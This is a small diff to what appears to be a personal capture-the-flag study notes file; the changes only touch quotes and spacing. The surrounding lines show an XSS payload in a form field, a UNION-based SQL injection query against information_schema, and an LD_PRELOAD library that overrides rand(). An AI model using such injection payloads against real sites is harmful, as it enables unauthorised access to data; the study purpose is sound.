@@ -238,7 +238,7 @@ email=<scripttt>alert("Succ3ssful%2bXSS")</scripttt>&content=hack+test
     <code>SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'</code>
 </code>
 ```
-- The INFORMATION_SCHEMA Database: “This is the database about databases. It’s used to store details of other databases on the server”.
+- The INFORMATION_SCHEMA Database: "This is the database about databases. It’s used to store details of other databases on the server".
 
 - ``` /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people" ```
 - this requey can only retrieve one column_nmae of the people table.
@@ -1133,6 +1133,7 @@ run
 **Leverage LD_PRELOAD**
 - use **LD_PRELOAD** to cheat. https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
 - random_num.c
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -1145,13 +1146,16 @@ int main(){
   return 0;
 }
 ```
+
 - ``` gcc random_num.c -o random_num ```
 - unrandom.c
+
 ```c
 int rand(){
     return 42; //the most random number in the universe
 }
 ```
+
 - ``` gcc -shared -fPIC unrandom.c -o unrandom.so ```
 - ``` LD_PRELOAD=$PWD/unrandom.so ./random_nums ``` not random, but random when ``` ./random_nums ```
 - ``` export LD_PRELOAD=$PWD/unrandom.so ``` set to env, and, not random even ``` ./ random_nums ```
